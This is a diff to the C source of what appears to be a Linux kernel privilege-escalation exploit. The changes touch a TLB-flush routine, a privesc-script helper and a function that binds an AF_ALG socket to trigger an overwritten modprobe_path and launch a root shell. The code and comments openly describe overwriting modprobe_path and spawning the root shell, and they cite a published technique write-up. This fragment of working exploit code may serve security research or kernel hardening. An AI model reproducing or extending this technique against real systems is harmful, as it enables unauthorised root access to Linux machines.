@@ -184,6 +184,8 @@ int flush_tlb(void *addr, size_t len)
 
 	munmap(status, sizeof(short));
 
+	printf("[+] TLB is flushed\n");
+
 	return EXIT_SUCCESS;
 }
 
@@ -340,7 +342,7 @@ int prepare_privesc_script(char *path, size_t path_size)
 }
 
 /* See https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch */
-int trigger_modprobe_sock(void)
+void trigger_modprobe_sock(void)
 {
 	struct sockaddr_alg sa = {
 		.salg_family = AF_ALG,
@@ -348,16 +350,15 @@ int trigger_modprobe_sock(void)
 	};
 	int alg_fd = -1;
 
+	printf("[!] gonna trigger modprobe using AF_ALG socket and launch the root shell\n");
 	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
-	if (alg_fd < 0) {
-		perror("[-] crypto socket");
-		return EXIT_FAILURE;
-	}
-
-	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)); /* launch the root shell */
-
+	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
 	printf("[!] root shell is finished\n");
-	return EXIT_SUCCESS;
+
+	if (alg_fd >= 0) {
+		if (close(alg_fd) < 0)
+			perror("[-] close alg_fd");
+	}
 }
 
 int main(void)
@@ -510,13 +511,9 @@ int main(void)
 		printf("[+] modprobe_path is changed to %s\n", privesc_script_path);
 
 		/* Launch the root shell */
-		ret = trigger_modprobe_sock();
-		if (ret == EXIT_FAILURE) {
-			break;
-		} else {
-			result = EXIT_SUCCESS;
-			goto end; /* root shell is finished */
-		}
+		trigger_modprobe_sock();
+		result = EXIT_SUCCESS;
+		goto end; /* root shell is finished */
 	}
 
 	printf("[-] failed to find / overwrite / trigger modprobe\n");
